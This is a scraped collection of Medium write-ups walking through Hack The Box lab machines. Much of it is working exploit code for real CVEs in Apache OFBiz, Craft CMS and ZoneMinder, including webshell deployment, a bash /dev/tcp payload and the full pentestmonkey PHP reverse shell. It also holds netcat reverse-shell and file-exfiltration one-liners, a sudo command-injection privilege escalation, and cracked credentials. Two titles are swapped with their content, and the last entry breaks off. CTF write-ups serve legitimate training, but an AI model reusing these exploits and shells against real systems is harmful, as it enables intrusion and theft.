[
    {
        "title": "Hack The Box (Surveillance) | by Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-surveillance-5a0c8f716e53",
        "content": "import argparseimport loggingimport osimport subprocessimport base64import requestsimport urllib3# Disable SSL verification warning for simplicityurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)def validate_url(url):    \"\"\"    Validate the URL schema.    \"\"\"    if not url.startswith(\"http://\") and not url.startswith(\"https://\"):        raise ValueError(\"Invalid URL schema. Use 'http://' or 'https://'.\")def scan(url):    \"\"\"    Perform a basic scan on the specified URL.    \"\"\"    print(\"[+] Scanning started...\")    try:        target_url = f\"{url}/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y\"        response = requests.get(target_url, verify=False)        response.raise_for_status()  # Raise an HTTPError for bad responses (4xx or 5xx)        if \"PONG\" in response.text:            print(\"[+] Apache OFBiz instance seems to be vulnerable.\")        else:            print(\"[-] Apache OFBiz instance seems NOT to be vulnerable.\")    except requests.exceptions.RequestException as e:        print(f\"[-] LOG: An error occurred during the scan: {e}\")def get_encoded_payload(cmd):    \"\"\"    Generate an encoded payload based on the provided command.    \"\"\"    if not os.path.isfile(\"ysoserial-all.jar\"):        logging.error(\"[-] ysoserial-all.jar not found. Exiting.\")        exit(1)    print(\"[+] Generating payload...\")    try:        #print(f\"[+] Running the following command: {cmd}\")        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, text=False)        encoded_output = base64.b64encode(result.stdout).decode().replace(\"\\n\", \"\")        print(\"[+] Payload generated successfully.\")    except subprocess.CalledProcessError as e:        print(f\"[-] LOG: An error occurred during payload generation: {e}\")    return encoded_outputdef send_post_request(url, encoded_output):    \"\"\"    Send a POST request with a malicious serialized payload.    \"\"\"    print(\"[+] Sending malicious serialized payload...\")    try:        target_url = f\"{url}/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y\"        headers = {            \"Content-Type\": \"application/xml\",        }        xml_data = f\"\"\"<?xml version=\"1.0\"?>            <methodCall>              <methodName>Methodname</methodName>              <params>                <param>                  <value>                    <struct>                      <member>                        <name>test</name>                        <value>                          <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">{encoded_output}</serializable>                        </value>                      </member>                    </struct>                  </value>                </param>              </params>            </methodCall>        \"\"\"        response = requests.post(target_url, headers=headers, data=xml_data, verify=False)        if response.status_code == 200:            print(\"[+] The request has been successfully sent. Check the result of the command.\")        else:            print(\"[-] Failed to send the request. Check the connection or try again.\")    except requests.exceptions.RequestException as e:        print(f\"[-] LOG: An error occurred during the scan: {e}\")def main():    \"\"\"    Main function for executing the script.    \"\"\"    parser = argparse.ArgumentParser(description=\"Exploit script for Apache EFBiz auth vulnerability (CVE-2023-49070 and CVE-2023-51467).\")    parser.add_argument(\"--url\", required=True, help=\"EFBIZ's URL to send requests to.\")    parser.add_argument(\"--cmd\", help=\"Command to run on the remote server. Optional.\")    args = parser.parse_args()    url = args.url.rstrip('/')    validate_url(args.url)    if args.cmd is None:        scan(url)    else:        command = f\"java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsBeanutils1 '{args.cmd}'\"        encoded_output = get_encoded_payload(command)        send_post_request(url, encoded_output)if __name__ == \"__main__\":    main()\nAnalyzing the python script here is a breakdown of what its doing:\n* Import necessary libraries: The script imports several Python libraries, including argparse for command-line argument parsing, logging for logging messages, os for interacting with the operating system, subprocess for running external commands, base64 for encoding and decoding data in Base64 format, requests for making HTTP requests, and urllib3 to disable SSL verification warnings.\n* Define a function validate_url(url) to check the URL schema: This function is used to ensure that the provided URL starts with either “http://” or “https://.\" If the URL does not match this format, it raises a ValueError.\n* Define a function scan(url) to perform a basic scan: This function constructs a target URL based on the provided URL and sends an HTTP GET request to it. It looks for the presence of “PONG” in the response text, indicating a vulnerability in the Apache OFBiz instance. If “PONG” is found, it prints that the instance seems to be vulnerable; otherwise, it prints that it’s not vulnerable.\n* Define a function get_encoded_payload(cmd) to generate an encoded payload: This function generates an encoded payload based on a provided command. It checks if the ysoserial-all.jar file exists and then runs the provided command using subprocess.run. It encodes the command’s output in Base64 format and returns the encoded payload as a string.\n* Define a function send_post_request(url, encoded_output) to send a POST request: This function constructs an XML-RPC POST request with a malicious serialized payload and sends it to a target URL. It sets the Content-Type header to “application/xml” and includes the encoded payload in the XML data. It checks the HTTP response status code to determine whether the request was successful.\n* Define the main() function: This is the main entry point of the script. It uses argparse to parse command-line arguments, including the target URL ( — url) and an optional command ( — cmd) to execute on the remote server. It validates the URL, and if no command is provided, it calls the scan() function to check for the Apache OFBiz vulnerability. If a command is provided, it generates the payload and sends the malicious request.\n* Execute the script if it’s the main module: The script checks if it’s being run as the main module (not imported as a library) and calls the main() function to start the execution.\nSince the script is allowing commands to be executed on the server I set up a netcat listener on my machine and when running the exploit I specified the netcat command to call back to my machine:\nOn my attack machine:\nIn another terminal window in the directory where the exploit resides:\npython3 exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/sh <your ip here> 4444'\nI got a shell as user ofbiz hell yeah! This shell sucked so I ran the following command to upgrade it to a more stable one:\n/usr/bin/script -qc /bin/bash /dev/null\nGetting root was hard for me. I ran to Linpeas and didn’t see anything that could lead me to finding privesc. I had to peek through files on the system to see if I could find a hash or password because I did notice that the Derby database was being used, so I went to the directory path where it was storing its .dat files.\nI ran this command to narrow down which files had “SHA” in them for a hash:\nThe file c54d0.dat had the hash I was looking for..\nfind /opt/ofbiz/runtime/data/derby/ofbiz/seg0 -type f -name “*.dat” -exec grep “SHA” {} \\;\nThe file c54d0.dat ended up having the hash I was looking for after some trial an error.\nThe next step is cracking the hash to obtain a password. I chopped the beginning strings of the hash “$SHA$d$” and converted them using Cyberchef; that way, I could run hashcat against it."
    },
    {
        "title": "Keep Calm and Hack The Box — Lame | by Sonya Moisset",
        "link": "https://medium.com/sonyamoisset/keep-calm-and-hack-the-box-lame-b36f818bdf32",
        "content": "Step 1 — Scanning the network\nThe first step before exploiting a machine is to do a little bit of scanning and reconnaissance.\nThis is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on that phase to get as much information as you could.\nI will use Nmap (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.\nThere are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation here\nI use the following command to get a basic idea of what we are scanning\n-sV: Probe open ports to determine service/version info\n-O: Enable OS detection\n-F: Fast mode — Scan fewer ports than the default scan\n— version-light: Limit to most likely probes (intensity 2)\n10.10.10.3: IP address of the Lame box\nYou can also use Zenmap, which is the official Nmap Security Scanner GUI. It is a multi-platform, free and open source application which aims to make Nmap easy for beginners to use while providing advanced features for experienced Nmap users.\nI use a different set of commands to perform an intensive scan\n-A: Enable OS detection, version detection, script scanning, and traceroute\n-v: Increase verbosity level\n10.10.10.3: IP address of the Lame box\nIf you find the results a little bit too overwhelming, you can move to the Ports/Hosts tab to only get the open ports\nWe can see that there are 4 open ports:\nPort 21. File Transfer Protocol (FTP) control (command)\nPort 22. Secure Shell (SSH), secure logins, file transfers (scp, sftp) and port forwarding\nPort 139. NetBIOS Session Service\nPort 445. Microsoft-DS (Directory Services) SMB file sharing\nLet see what we can get with the first port\nStep 2 — The Vulnerable FTP\nWe will use Searchsploit to check if there’s any known vulnerability on vsftpd 2.3.4. Searchsploit is a command line search tool for Exploit Database\nI use the following command\nNow that we know that there is a vulnerability — Backdoor Command Execution — let’s try to exploit it\nWe will use Metasploit. It’s a penetration testing framework that makes hacking simple. It’s an essential tool for many attackers and defenders\nI launch Metasploit Framework on Kali and look for command I should use to launch the exploit\nI use the command to look for all the payloads available\nWe can see there are several different exploits but the one we’re interested in is number 4\nI use the following command for the exploit\nThis will launch the exploit. I use this command to display the available options\nYou can see that the remote host (RHOSTS) is not yet set. I will set both the remote host and the target as these two pieces of information are needed to run the exploit\nI use the following command to set the remote host using the IP address of HTB Lame box\nThen I set the target to 0 as displayed when I checked the options\nWe can now run the exploit\nUnfortunately we can see that even if the exploit is completed, no session was created. The vulnerability has been patched as mentioned here, in the description of the exploit.\nThis module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011.\nThe Exploit Database is a Common Vulnerabilities and Exposures (CVE) compliant archive of public exploits and corresponding vulnerable software, developed for use by penetration testers and vulnerability researchers. The aim is to serve the most comprehensive collection of exploits gathered through direct submissions, mailing lists, as well as other public sources, and present them in a freely-available and easy-to-navigate database. The Exploit Database is a repository for exploits and proof-of-concepts rather than advisories, making it a valuable resource for those who need actionable data right away\nWe need to find another way. Let’s have a look at another port!\nYou can read the whole article on freeCodeCamp News website"
    },
    {
        "title": "Hack The Box (Bizness) | by Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-bizness-60728bcde635",
        "content": "I’ve been on the Hack The Box platform for many years now and It sharpens my hacking skills. This machine was one of my favorites to hack. It was a Medium level machine and I am proud of myself for owning it. The machine goes over a heavy enumeration that leads to exploiting Craft CMSto get a low-level shell on the server. Privilege escalation was performed by doing a local port-forward with ssh exploiting ZoneMinder.\nThey are always watching you…\nEnumeration:\nI blastedautoreconat the IP and got back only two ports which was sweet. I served up all of my scan results from autorecon to my Python local HTTP server. This helps me stay organized when viewing my results in a web browser.\nsudo $(which autorecon) <Target IP Here>\nIn another terminal window while autorecon is running:\npython -m http.server 80\nNmap Results:\nNmap scan report for 10.10.11.245Host is up, received user-set (0.076s latency).Scanned at 2024-02-13 15:51:45 PST for 72sNot shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE REASON         VERSION22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://surveillance.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS\nVisiting the IP in Firefox It was trying to communicate with the domain surveillance.htb. I mapped the domain to the machine's IP in the/etc/hosts file.\nsudo nano /etc/hosts\nRevisiting the IP back in my browser resolved it to the domain and was able to access the page.\nThe company offers Cameras, Intrusion, Perimeter Security, Access Control & Intercom services.\nThe first thing I always do when navigating a web page is analyze it by hitting ctrl-u on my keyboard for the“View Page Source” functionality in Firefox. I had the wappalyzerextension installed also so this gave me some info on what technologies the server was using.\nI did a keyword search in the view page source ctrl-f for “CMS” and came across some version information.\nExploitation:\nDoing some googling of the version I found an exploit on Github that this person spoiled for us since it's related to this machine.\nThanks anyway dude 😏.\n#!/usr/bin/env python3#coding: utf-8# Exploit Title: Craft CMS unauthenticated Remote Code Execution (RCE)# Date: 2023-12-26# Version: 4.0.0-RC1 - 4.4.14# Vendor Homepage: https://craftcms.com/# Software Link: https://github.com/craftcms/cms/releases/tag/4.4.14# Tested on: Ubuntu 22.04.3 LTS# Tested on: Craft CMS 4.4.14# Exploit Author: Olivier Lasne# CVE : CVE-2023-41892# References :# https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g# https://blog.calif.io/p/craftcms-rceimport requestsimport sys, reif(len(sys.argv) < 2):    print(f\"\\033[1;96mUsage:\\033[0m python {sys.argv[0]} \\033[1;96m<url>\\033[0m\")    exit()HOST = sys.argv[1]if not re.match('^https?://.*', HOST):    print(\"\\033[1;31m[-]\\033[0m URL should start with http or https\")    exit()print(\"\\033[1;96m[+]\\033[0m Executing phpinfo to extract some config infos\")## Execute phpinfo() and extract config info from the websiteurl = HOST + '/index.php'content_type = {'Content-Type': 'application/x-www-form-urlencoded'}data = r'action=conditions/render&test[userCondition]=craft\\elements\\conditions\\users\\UserCondition&config={\"name\":\"test[userCondition]\",\"as xyz\":{\"class\":\"\\\\GuzzleHttp\\\\Psr7\\\\FnStream\",\"__construct()\":[{\"close\":null}],\"_fn_close\":\"phpinfo\"}}'try:    r = requests.post(url, headers=content_type, data=data)except:    print(f\"\\033[1;31m[-]\\033[0m Could not connect to {HOST}\")    exit()# If we succeed, we should have default phpinfo credits if not 'PHP Group' in r.text: print(f'\\033[1;31m[-]\\033[0m {HOST} is not exploitable.') exit()# Extract config value for tmp_dir and document_rootpattern1 = r'<tr><td class=\"e\">upload_tmp_dir<\\/td><td class=\"v\">(.*?)<\\/td><td class=\"v\">(.*?)<\\/td><\\/tr>'pattern2 = r'<tr><td class=\"e\">\\$_SERVER\\[\\'DOCUMENT_ROOT\\'\\]<\\/td><td class=\"v\">([^<]+)<\\/td><\\/tr>'tmp_dir       = re.search(pattern1, r.text, re.DOTALL).group(1)document_root = re.search(pattern2, r.text, re.DOTALL).group(1)if 'no value' in tmp_dir: tmp_dir = '/tmp'print(f'temporary directory: {tmp_dir}')print(f'web server root: {document_root}')## Create shell.php in tmp_dirdata = {    \"action\": \"conditions/render\",    \"configObject[class]\": \"craft\\elements\\conditions\\ElementCondition\",    \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"msl:/etc/passwd\"}}}'}files = {    \"image1\": (\"pwn1.msl\", \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>    <image>    <read filename=\"caption:<?php @system(@$_REQUEST['cmd']); ?>\"/>    <write filename=\"info:DOCUMENTROOT/shell.php\"/>    </image>\"\"\".replace(\"DOCUMENTROOT\", document_root), \"text/plain\")}print(f'\\033[1;96m[+]\\033[0m create shell.php in {tmp_dir}')r = requests.post(url, data=data, files=files) #, proxies={'http' : 'http://127.0.0.1:8080'}) #  # Use the Imagick trick to move the webshell in DOCUMENT_ROOTdata = {    \"action\": \"conditions/render\",    \"configObject[class]\": r\"craft\\elements\\conditions\\ElementCondition\",    \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"vid:msl:' + tmp_dir + r'/php*\"}}}'}print(f'\\033[1;96m[+]\\033[0m trick imagick to move shell.php in {document_root}')r = requests.post(url, data=data) #, proxies={\"http\": \"http://127.0.0.1:8080\"})if r.status_code != 502:    print(\"\\033[1;31m[-]\\033[0m Exploit failed\")    exit()print(f\"\\n\\033[1;95m[+]\\033[0m Webshell is deployed: {HOST}/\\033[1mshell.php\\033[0m?cmd=whoami\")print(f\"\\033[1;95m[+]\\033[0m Remember to \\033[1mdelete shell.php\\033[0m in \\033[1m{document_root}\\033[0m when you're done\\n\")print(\"\\033[1;92m[!]\\033[0m Enjoy your shell\\n\")url = HOST + '/shell.php'## Pseudo Shellwhile True:    command = input('\\033[1;96m>\\033[0m ')    if command == 'exit':        exit()    if command == 'clear' or command == 'cls':        print('\\n' * 100)        print('\\033[H\\033[3J', end='')        continue    data = {'cmd' : command}    r = requests.post(url, data=data) #, proxies={\"http\": \"http://127.0.0.1:8080\"})    # exit if we have an error    if r.status_code != 200:        print(f\"Error: status code {r.status_code} for {url}\")        exit()    res_command = r.text    res_command = re.sub('^caption:', '', res_command)    res_command = re.sub(' CAPTION.*$', '', res_command)    print(res_command, end='')\nOkay let's at least do a breakdown of what this exploit code is doing:\nThis Python script is an exploit for a vulnerability (CVE-2023–41892) in Craft CMS, versions 4.0.0-RC1 through 4.4.14, which allows unauthenticated remote code execution (RCE).\n* Usage Check: The script checks if it has been provided with the required command-line argument (the URL of the vulnerable Craft CMS instance).\n* Execute PHPInfo: Sends a request to the target Craft CMS instance to execute phpinfo() and extract configuration information.\n* Extract Configuration: Parses the response from phpinfo() to extract values for upload_tmp_dir and $_SERVER[‘DOCUMENT_ROOT’].\n* Create Shell: Constructs a malicious PHP file (shell.php) with code that allows command execution on the server.\n* Upload Shell: Uploads the malicious PHP file to the target server using a crafted request. It uses an Imagick trick to move the shell to the document root.\n* Interactive Shell: Once the shell is deployed, the script enters an interactive mode where it allows the user to execute commands on the target system through the uploaded shell.\n* Clean-Up: Provides instructions on how to delete the uploaded shell after use.\nsudo git clone https://github.com/Faelian/CraftCMS_CVE-2023-41892cd CraftCMS_CVE-2023-41892python3 craft-cms.py http://surveillance.htb/\nThe shell that was given to me was absolutely trash so I decided to run another reverse shell back to my machine.\nOn my attack machine:\nnc -nlvp 1234\nOn the target machine:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your IP here> 1234 >/tmp/f/usr/bin/script -qc /bin/bash /dev/null\nPost-Exploitation:\nThe next step for me since I was only www-data, wasto enumerate the system for password files, etc. I pushed linpeas onto the machine and found some juicy stuff that led me to an insane amount of rabbit holes.\nSorry, Alice sometimes it be like that.\nI took note of the passwords discovered and connected to the MySQL databases found password hashes tried to break them and got nothing…\nLooking back at my Linpeas results I found this interesting file:\nvar/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip\nI pushed the file onto my machine so I could analyze it further.\nOn my attack machine:\nnc -l -p <port>  > surveillance--2023-10-17-202801--v4.4.14.sql.zip\nOn the target machine:\nnc <attackers ip> <port> < surveillance--2023-10-17-202801--v4.4.14.sql.zip\nOpened the file with gedit and did a ctr-f related to users that I found on the system or passwords and came across a hash for Matthew.\nRan a hash-identifier to discover what type of hash I was working with and it was SHA-256.\nThrew the hash into a file ran Johnny Boy the Ripper on it and then sshd onto the machine.\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256\nNice password Matthew you nerd!\nusername: matthewpassword: starcraft122490\nsudo ssh -oHostKeyAlgorithms=+ssh-dss matthew@10.10.11.245\nI ran linpeas again and revisited the section where it highlighted open active ports and port 8080 was interesting to me.\nTo access this port I needed to do an SSH Local Port Forward. A local Port redirects traffic from a local port on the client machine to a specified port on a remote server through an SSH connection.\nOn my attack machine I ran:\nssh -L 2222:127.0.0.1:8080 matthew@10.10.11.245\nVisited my localhost IP in a browser on port 2222 and was presented with a ZoneMinder login page.\nLike any great hacker would do next I googled for any exploits out there available for ZoneMinder and came across yet another RCE-related exploit.\nsudo git clone https://github.com/rvizx/CVE-2023-26035cd CVE-2023-26035nc -nlvp 7777python3 exploit.py -t http://127.0.0.1:2222/ -i <your Attacker IP here> -p 7777\nLet’s break down this exploit code also:\nimport reimport requestsfrom bs4 import BeautifulSoupimport argparseimport base64# CVE-2023-26035 - Unauthenticated RCE in ZoneMinder Snapshots# Author : Ravindu Wickramasinghe | rvz (@RVIZX9)class ZoneMinderExploit:    def __init__(self, target_uri):        self.target_uri = target_uri        self.csrf_magic = None    def fetch_csrf_token(self):        print(\"[>] fetching csrt token\")        response = requests.get(self.target_uri)        self.csrf_magic = self.get_csrf_magic(response)        if response.status_code == 200 and re.match(r'^key:[a-f0-9]{40},\\d+', self.csrf_magic):            print(f\"[>] recieved the token: {self.csrf_magic}\")            return True        print(\"[!] unable to fetch or parse token.\")        return False    def get_csrf_magic(self, response):        return BeautifulSoup(response.text, 'html.parser').find('input', {'name': '__csrf_magic'}).get('value', None)    def execute_command(self, cmd):        print(\"[>] sending payload..\")        data = {'view': 'snapshot', 'action': 'create', 'monitor_ids[0][Id]': f';{cmd}', '__csrf_magic': self.csrf_magic}        response = requests.post(f\"{self.target_uri}/index.php\", data=data)        print(\"[>] payload sent\" if response.status_code == 200 else \"[!] failed to send payload\")    def exploit(self, payload):        if self.fetch_csrf_token():            print(f\"[>] executing...\")            self.execute_command(payload)if __name__ == \"__main__\":    parser = argparse.ArgumentParser()    parser.add_argument('-t', '--target-url', required=True, help='target url endpoint')    parser.add_argument('-ip', '--local-ip', required=True, help='local ip')    parser.add_argument('-p', '--port', required=True, help='port')    args = parser.parse_args()    # generating the payload    ps1 = f\"bash -i >& /dev/tcp/{args.local_ip}/{args.port} 0>&1\"      ps2 = base64.b64encode(ps1.encode()).decode()    payload = f\"echo {ps2} | base64 -d | /bin/bash\"    ZoneMinderExploit(args.target_url).exploit(payload)\nThis Python script is an exploit for (CVE-2023–26035), which is an unauthenticated Remote Code Execution (RCE) vulnerability in ZoneMinder Snapshots.\n* The script imports necessary modules: re for regular expressions, requests for making HTTP requests, BeautifulSoup from the bs4 library for parsing HTML, argparse for parsing command-line arguments, and base64 for encoding payloads.\nZoneMinderExploit Class:\n* This class encapsulates the exploit logic:\n* The __init__ method initializes the target URI and CSRF token.\n* The fetch_csrf_token method sends a GET request to the target URI to fetch the CSRF token from the HTML response.\n* The get_csrf_magic method parses the HTML response to extract the CSRF token.\n* The execute_command method sends a POST request with a payload to execute arbitrary commands on the target.\n* The exploit method orchestrates the exploit by fetching the CSRF token and executing the payload.\nPayload Generation:\n* The script parses command-line arguments to obtain the target URL, local IP, and port.\n* It generates a payload (ps1) that establishes a reverse shell connection to the specified local IP and port using bash.\n* The payload is encoded using base64 (ps2), and a final payload is constructed to decode and execute the payload using base64 and bash.\nCommand-Line Argument Parsing:\n* The script uses argparse to parse command-line arguments, expecting the target URL, local IP, and port.\nExploit Execution:\n* The script instantiates the ZoneMinderExploit class with the target URL and calls the exploit method, passing the generated payload.\n* The exploit fetches the CSRF token and then executes the payload to establish a reverse shell on the target system.\nThe first thing I always do and I mean always is run sudo -l .\nThis had me chasing my tail for a while and had no idea how to abuse this. Eventually, I decided to look in the /usr/bin directory for all zm related scripts and found zmupdate.pl .\nDid some reverse engineering on this file and saw that the user= argument parameter was vulnerable to an injection attack. So I ran the file passed my injection to the user argument and got a shell as root!\nsudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023\nThe shell was super buggy and couldn't run anything as root so I did another reverse shell back onto my machine and got a stable shell.\nOn the target machine after running the exploit:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 3333 >/tmp/f"
    },
    {
        "title": "Hack The Box (Devvortex) - Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-devvortex-9cc1ad2961b5",
        "content": "Let me give you a little breakdown of that this ruby code is doing:\n* Shebang Line: The script starts with a shebang line (#!/usr/bin/env ruby), indicating that it should be executed using the Ruby interpreter.\n* Exploit Information: The code includes comments that provide details about the exploit, such as its title, author, CVE identifier, and references to relevant websites and sources related to the vulnerability.\n* Required Libraries: The script requires several Ruby libraries, including json, httpx, docopt, and paint, which are used for various purposes, such as handling JSON data, making HTTP requests, parsing command-line arguments, and displaying colored output.\n* Docopt Usage and Options: The script defines a docopt usage section, which describes how to use the script and its command-line options. It specifies the required argument <url> and optional options like — debug, — no-color, and -h or — help.\n* Functions: The script defines several functions to perform specific tasks:\nfetch_users, parse_users, and display_users: These functions fetch and display information about Joomla! users from a given URL.fetch_config, parse_config, and display_config: These functions fetch and display configuration information about the Joomla! site.Main Execution Block: In the main part of the script, it:\n* Parses command-line arguments using docopt.Sets the display mode for colored output based on the — no-color option.Calls the functions to retrieve and display user and configuration information from the Joomla! site specified in the command-line argument.\n* Error Handling: The script includes basic error handling using begin and rescue blocks to catch and display any Docopt::Exit exceptions.\nIn summary, this Ruby script is designed to exploit a specific vulnerability in Joomla! (< 4.2.8) that allows unauthenticated users to disclose information about Joomla! users and site configuration. It retrieves and displays this information from the specified Joomla! site URL. It also provides command-line options for customization and error handling.\ngem install httpx docopt paintruby exploit.rb http://dev.devvortex.htb\nThe exploit puked out the user Lewis along with his password ;).\nDB user: lewisDB password: P4ntherg0t1n5r3c0n##\nI tried ssh with the creds and no luck so I moved on to the joomla admin interface on the web and was able to login as lewis.\nI googled authenticated attacks. I can perform on Jommla to get a shell, and reading back at the hacktricks article, you can target the templates to get a PHP reverse shell.\nUsing the pentestmonkey’s shell, I had to edit the code and add my IP address where it says “CHANGE THIS”.\n<?php// php-reverse-shell - A Reverse Shell implementation in PHP// Copyright (C) 2007 pentestmonkey@pentestmonkey.net//// This tool may be used for legal purposes only.  Users take full responsibility// for any actions performed using this tool.  The author accepts no liability// for damage caused by this tool.  If these terms are not acceptable to you, then// do not use this tool.//// In all other respects the GPL version 2 applies://// This program is free software; you can redistribute it and/or modify// it under the terms of the GNU General Public License version 2 as// published by the Free Software Foundation.//// This program is distributed in the hope that it will be useful,// but WITHOUT ANY WARRANTY; without even the implied warranty of// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the// GNU General Public License for more details.//// You should have received a copy of the GNU General Public License along// with this program; if not, write to the Free Software Foundation, Inc.,// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.//// This tool may be used for legal purposes only.  Users take full responsibility// for any actions performed using this tool.  If these terms are not acceptable to// you, then do not use this tool.//// You are encouraged to send comments, improvements or suggestions to// me at pentestmonkey@pentestmonkey.net//// Description// -----------// This script will make an outbound TCP connection to a hardcoded IP and port.// The recipient will be given a shell running as the current user (apache normally).//// Limitations// -----------// proc_open and stream_set_blocking require PHP version 4.3+, or 5+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.//// Usage// -----// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.set_time_limit (0);$VERSION = \"1.0\";$ip = '127.0.0.1';  // CHANGE THIS$port = 1234;       // CHANGE THIS$chunk_size = 1400;$write_a = null;$error_a = null;$shell = 'uname -a; w; id; /bin/sh -i';$daemon = 0;$debug = 0;//// Daemonise ourself if possible to avoid zombies later//// pcntl_fork is hardly ever available, but will allow us to daemonise// our php process and avoid zombies.  Worth a try...if (function_exists('pcntl_fork')) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) {  printit(\"ERROR: Can't fork\");  exit(1); } if ($pid) {  exit(0);  // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) {  printit(\"Error: Can't setsid()\");  exit(1); } $daemon = 1;} else { printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");}// Change to a safe directorychdir(\"/\");// Remove any umask we inheritedumask(0);//// Do the reverse shell...//// Open reverse connection$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) { printit(\"$errstr ($errno)\"); exit(1);}// Spawn shell process$descriptorspec = array(   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to);$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1);}// Set everything to non-blocking// Reason: Occsionally reads will block, even though stream_select tells us they won'tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(\"Successfully opened reverse shell to $ip:$port\");while (1) { // Check for end of TCP connection if (feof($sock)) {  printit(\"ERROR: Shell connection terminated\");  break; } // Check for end of STDOUT if (feof($pipes[1])) {  printit(\"ERROR: Shell process terminated\");  break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process's STDIN if (in_array($sock, $read_a)) {  if ($debug) printit(\"SOCK READ\");  $input = fread($sock, $chunk_size);  if ($debug) printit(\"SOCK: $input\");  fwrite($pipes[0], $input); } // If we can read from the process's STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) {  if ($debug) printit(\"STDOUT READ\");  $input = fread($pipes[1], $chunk_size);  if ($debug) printit(\"STDOUT: $input\");  fwrite($sock, $input); } // If we can read from the process's STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) {  if ($debug) printit(\"STDERR READ\");  $input = fread($pipes[2], $chunk_size);  if ($debug) printit(\"STDERR: $input\");  fwrite($sock, $input); }}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);// Like print, but does nothing if we've daemonised ourself// (I can't figure out how to redirect STDOUT like a proper daemon)function printit ($string) { if (!$daemon) {  print \"$string\\n\"; }}?>\nI edited the following template in error.php:\nSet up a netcat listener on my attack machine:\nnc -lvp 1234"
    },
    {
        "title": "Unleash Your Inner Hacker: Where to Start in Hack The ...",
        "link": "https://medium.com/@pedro.correia_8569/unleash-your-inner-hacker-where-to-start-in-hack-the-box-pt-2-13fa9db6a2d2",
